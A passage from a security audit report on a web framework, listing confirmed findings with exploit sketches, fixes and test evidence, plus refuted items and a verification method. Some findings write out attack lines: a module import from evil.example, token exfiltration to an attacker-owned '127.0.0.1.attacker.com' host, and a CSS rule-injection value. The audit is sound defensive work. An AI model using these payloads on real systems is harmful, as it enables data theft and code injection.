  - **Exploit:** an attacker-controlled `data-stream-renderer` attribute (surviving safeRichHtml's `data-*` passthrough) + the _module_ loader configured with a raw `import()` → cross-origin module import/exec. **Gated behind a non-default loader** (the default inline loader wraps `im` with the `ki` allowlist), so default-config apps are safe.
  - **Verified:** worktree — `new StreamTextBuffer({importModule:raw}).render()` imports `https://evil.example/x.js`; the sibling sinks' assert throws on it.
  - **Distinct:** bugz-2 M4 was the inline guard being too _permissive_; this is a missing explicit gate in the module stream-text path.
  - **Fix:** call `assertAllowedKovoDynamicImportUrl` in `StreamTextBuffer.render()` like the sibling sinks.
  - **Evidence:** `pnpm exec vitest run packages/browser/src/mutation-response-apply.test.ts --run`
    passed after integration; stream renderer imports now reject URLs outside the Kovo dynamic-import allowlist.

- [x] **L8 — The CI egress floor classifies any `127.`-prefixed _hostname_ as loopback, allowing exfil to attacker-owned `127.x.*` domains under deny-all.** `scripts/egress-floor-hook.cjs:27-36`
  - `isLoopbackHost` does `normalized.startsWith('127.')` on the host _name_, not an in-`127.0.0.0/8` address check, so `127.0.0.1.attacker.com` (resolving to the attacker) is treated as loopback and allowed.
  - **Exploit:** a malicious build/publish dependency (the floor's threat model) connects/resolves to `http://127.0.0.1.attacker.com/?d=<token>` and exfiltrates under deny-all. Repo CI tooling, not shipped framework code.
  - **Verified:** worktree — `isLoopbackHost('127.0.0.1.attacker.com') === true`.
  - **Distinct:** bugz H2 is the runtime egress address[0]; bugz-3 L7 is this hook's DNS/UDP protocol coverage; this is the host-name prefix classification.
  - **Fix:** parse the host as an IP and check membership in `127.0.0.0/8` (and `::1`); never string-prefix the name.
  - **Evidence:** `pnpm exec vitest run scripts/egress-floor.test.mjs --run` passed after integration;
    `127.evil.example` is no longer treated as loopback.

- [x] **L9 — The `_headers` sidecar keys the per-document security floor at `/index.html` (never `/`) with no `/*` document catch-all, so pretty-URL/homepage requests can ship without the header floor.** `packages/server/src/static-export-output.ts:308-334`
  - The dynamic presets apply `documentStaticHeaders` to every document via a `/(.*)` catch-all; the sidecar instead emits one stanza per document keyed to its emitted file path (`/index.html`, `/about/index.html`) and no `/*` fallback. On hosts that match `_headers` against the _request_ path (Cloudflare Pages), a request to `/` or `/about/` matches no rule → no X-Frame-Options/COOP/Permissions-Policy/Referrer-Policy.
  - **Verified:** source-proof at HEAD — root artifact path is `/index.html`, pushed verbatim; only `/c/*`+`/assets/*` extra stanzas, no `/*` document fallback.
  - **Distinct:** bugz M4 = whether a sidecar is emitted; bugz-3 L8 = the immutable-asset stanzas; this is the document stanza _key_ and missing catch-all.
  - **Fix:** emit a `/*` document stanza carrying `documentStaticHeaders` (and/or key root document to `/`).
  - **Evidence:** `pnpm exec vitest run packages/server/src/static-export-output.test.ts --run`
    passed after integration; `_headers` now includes pretty-route document stanzas and a common `/*` fallback.

- [x] **L10 — bugz-3 L10 residual: the CSS-value guard doesn't cover `style.create`/`keyframes`, nor token/step NAMES — CSS rule injection escapes the guard.** `packages/style/src/engine.ts:629-640,700-726,524-540`
  - `assertCssValueSafe` (rejects `<>{};\\`+controls) is wired into only `defineVars`/`createTheme` and only for the _value_. `style.create()`/`createAtomicStyles()` serialize values into identical `__rules[].rule` strings with no guard, and `keyframes()` serializes both the value and the step NAME, and `defineVars` doesn't guard the token NAME.
  - **Exploit:** `createAtomicStyles({a:{color:'red}html{background:url(//evil)'}})` injects a sibling rule; the same value can carry `</style>` if inlined. No default-config breach (these are build-time `@kovojs/style/internal` consumed with author-trusted literals).
  - **Verified:** worktree — `defineVars`/`createTheme` value THROWS (guard fires); `createAtomicStyles`/`createKeyframes`/token-name forms produce injection-bearing output.
  - **Distinct:** bugz-3 L10 fixed the `defineVars`/`createTheme` _value_; this covers the other functions + the NAME path.
  - **Fix:** route all rule-serializing functions (and token/step names) through `assertCssValueSafe`/an identifier validator.
  - **Evidence:** `pnpm exec vitest run packages/style/src/engine.test.ts --run` passed after
    integration; style.create, keyframes, and token/step names now fail closed on CSS breakout syntax.

- [x] **L11 — The capability download route serves private bearer-token files with no `Cache-Control` header (the declared `cache:'private'` is enforced only in dev/CI and never emitted).** `packages/server/src/capability-route.ts:302-311,329`
  - `createStorageDownloadEndpoint` hand-builds a 200 with an ETag and no Cache-Control; the only consumer of `cache:'private'`, `assertEndpointResponsePosture`, is a dev/CI-only assertion that _throws_ on mismatch — it never injects the header. So in production a shared cache can heuristically store the token-keyed private download.
  - **Verified:** worktree (2/2) — the download Response carries an ETag and no Cache-Control.
  - **Distinct:** bugz-3 M2 was the route/document path; this is the capability endpoint's hand-built response.
  - **Fix:** emit `Cache-Control: private, no-store` from the capability download handler (don't rely on the dev-only posture verifier).
  - **Evidence:** capability download success and rejection responses now emit `Cache-Control: private, no-store`
    and `Vary: Cookie`; the integrated server capability/keyring/env Vitest command above passed.

- [x] **L12 — The signing keyring (the single HMAC chokepoint) enforces no minimum secret length/entropy — only empty material is rejected.** `packages/server/src/keyring.ts:160-175`
  - `normalizeSigningKey`/`normalizeSecret` reject only `byteLength===0`; the 32-char `FRAMEWORK_SECRET_MIN_LENGTH` floor lives only in `env.ts` and runs only against `csrf.secret` at the createApp chokepoint. Capability signing and the public `createSigningKeyRing`/`signCapability`/`createSignUrl` paths impose no floor.
  - **Exploit:** `createSigningKeyRing({ keys:[{ id:'k', secret:'x', state:'active' }] })` signs with an ~8-bit key (offline-brute-forceable from one token). Requires an operator to supply the weak secret; no default-config breach.
  - **Verified:** worktree — a 1-byte keyring signs/verifies without throwing.
  - **Distinct:** a DiD/contract gap at the keyring sink, independent of the env-level csrf floor.
  - **Fix:** apply the framework minimum-length/entropy floor at `normalizeSecret` (the actual crypto boundary).
  - **Evidence:** `normalizeSigningKey` now enforces a 32-byte `SIGNING_SECRET_MIN_BYTES` floor; the integrated
    server capability/keyring/env Vitest command and `pnpm run check:api-surface` passed.

- [x] **L13 — `validateAppEnv` false-refuses a valid custom `SigningKeyRing` in production (misparsed as a malformed `{current}` secret object).** `packages/server/src/env.ts:156-206`
  - `validateFrameworkSecret` treats any non-array object as `{keys:[...]}` or `{current,previous}`; a `SigningKeyRing` instance (a first-class public `SigningSecret` form) has no enumerable `keys`, so it falls to reading `value.current` (undefined) → fatal `csrf.secret.current must be a string`.
  - **Exploit:** `createApp({ csrf: { secret: kmsBackedRing } })` is refused boot in production though the ring signs/verifies fine. Fails closed (bricks a legit deploy); not attacker-reachable.
  - **Verified:** worktree — a `{currentKeyId,sign,verify}` ring → fatal `must be a string` boot error.
  - **Distinct:** FS1/FS2 are missing validation; this is _incorrect_ validation false-positiving on a valid input.
  - **Fix:** detect a `SigningKeyRing` (duck-type `currentKeyId`/`sign`/`verify`) before the `{current}`/`{keys}` parse and accept it.
  - **Evidence:** `validateFrameworkSecret` now accepts `isSigningKeyRing(value)` before `{current}`/`{keys}`
    parsing; the integrated server capability/keyring/env Vitest command passed.

- [x] **L14 — Optimistic queue: a timed-out mutation that later settles applies stale server truth (and cross-tab broadcasts it) out of order, clobbering a later committed mutation.** `packages/browser/src/mutation-optimistic.ts:108-153`
  - On timeout, `MutationQueue` aborts the entry and drains to the next, but the task keeps awaiting its fetch; the CATCH branch guards on `queueState.timedOut` (proving the authors knew), while the SUCCESS and failed-response branches do **not** — a late success applies its (now stale) server truth and broadcasts it after a later mutation committed.
  - **Exploit:** a queued optimistic mutation A (count+1) then B (count+2) with a custom `enhancedMutations.fetch` wrapper that doesn't forward the abort signal (the docs invite a wrapper); A times out, B commits to count=2, then A's late success writes count=1 and broadcasts it. Gated on the queue + a non-abort-forwarding fetch wrapper.
  - **Verified:** worktree — real `submitOptimisticEnhancedMutation`+`MutationQueue(timeoutMs)`: a late success past timeout applies/broadcasts stale truth.
  - **Distinct:** not the keyed-optimism/lifecycle items (bugz-3, bugz-4 r1); this is the queue-timeout out-of-order apply.
  - **Fix:** guard the success and failed-response branches on `queueState.timedOut` too (drop a settled-after-timeout result), as the catch branch already does.
  - **Evidence:** `pnpm exec vitest run packages/browser/src/mutation-optimistic-queue.test.ts --run`
    passed after integration; a late timed-out head no longer applies stale server truth after the tail commits.

---

## Refuted / not carried forward

- **RenderedHtml single-escape brand keys on a global `Symbol.for`** — refuted: fail-safe; wire/query data cannot carry a JS Symbol, so the brand isn't forgeable from attacker input.
- **Default `ctx.signUrl` mints scope-less (per-object) capability tokens** — refuted: the SPEC's intended, honestly-labeled design (scope binding is an optional narrowing, not a promised default).
- **Pre-dispatch load-shed O(store.size) eviction scan per check** — refuted: store size is bounded by `maxKeys`; an attacker can't grow it unboundedly, so no amplification.
- **`verified-machine-auth` access marker passes the KV436 default-deny gate** — refuted: access markers are audit-only metadata, never read at runtime enforcement; the marker can't reach a user route as a decision.
- **Capability/storage-download signing secret bypasses the createApp refuse-to-boot floor (FS1)** — refuted as a standalone breach; the real residual is captured by L12 (keyring has no entropy floor) and L13 (validation false-positive). The auto-wired `ctx.signUrl` derives from the validated `csrf.secret`.
- **confidential-at-rest: dotted keyId envelope (CAR-A), Uint8Array-vs-string AAD trim asymmetry (CAR-B), non-canonical base64url key aliasing (CAR-C)** — refuted: inherent/universal encoding properties or out-of-threat-model; no default-config breach (also no shipped `decryptAtRest`).
- **Compiler never passes `tableDomains` to `deriveMutationTouchRegistry` (DRZ-TABLEDOM-3)** — refuted: the param is currently dead but the touch-graph fallback covers the multi-table case; no live under-invalidation beyond M13.
- **Inline bootstrap loader reuses the server-rendered Kovo-Idem field (cmq-2)** — refuted: the central technical claim did not hold under scrutiny.

## Verification methodology

Every confirmed item was reproduced in a throwaway `git worktree` off HEAD via
`.agents/skills/find-bugz/scripts/setup-bugz-worktree.sh` (detached worktree + symlinked
root/per-package `node_modules` + a minimal `vitest.bugz.config.ts`), with a test at
`packages/<pkg>/src/__bugz_*.test.ts` driving the real exported/internal functions, then
`git worktree remove --force`. DOM-dependent findings were reproduced as pure-logic / `node
--experimental-strip-types` runs (no jsdom is installed). Each finding was then independently
re-derived by a skeptic agent (default stance: refute) before being recorded; only `confirmed`
survived. The main working tree was never modified; all `bugz4*` worktrees were removed.
